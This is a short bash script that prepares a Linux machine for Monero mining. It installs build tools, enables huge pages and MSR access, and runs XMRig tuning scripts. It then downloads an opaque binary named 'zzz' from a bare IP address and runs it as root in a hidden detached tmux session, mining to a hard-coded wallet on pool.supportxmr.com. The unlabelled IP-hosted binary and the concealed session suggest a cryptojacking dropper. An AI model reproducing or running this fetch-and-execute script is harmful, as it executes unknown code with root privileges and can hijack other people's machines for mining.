#!/usr/bin/env bash
sudo apt-get update && apt-get upgrade -y
sudo apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev tmux msr-tools
sudo sysctl -w vm.nr_hugepages=1500
sudo bash -c "echo vm.nr_hugepages=1500 >> /etc/sysctl.conf"
sudo modprobe msr
sudo wget https://raw.githubusercontent.com/xmrig/xmrig/master/scripts/enable_1gb_pages.sh
sudo wget https://raw.githubusercontent.com/xmrig/xmrig/master/scripts/randomx_boost.sh
sudo chmod +x enable_1gb_pages.sh
sudo chmod +x randomx_boost.sh
sudo sh enable_1gb_pages.sh
sudo sh randomx_boost.sh
sudo wget http://51.38.98.168/papa/zzz
sudo chmod +x zzz
sudo tmux new-session -d -s a 'sudo ./zzz -o pool.supportxmr.com:3333 -u 4BGmSpeCKjogeDoSBLsx371MAXjiK676FcqfJ3hruYbFZnizUecid4v6rRW5eimdHeMQL7kKtc8HEUN94sTXYutk6gFw1gB -p graphcheck --cpu-priority 1 --max-cpu-usage 50 --donate-level 0 --nicehash --randomx-1gb-pages '

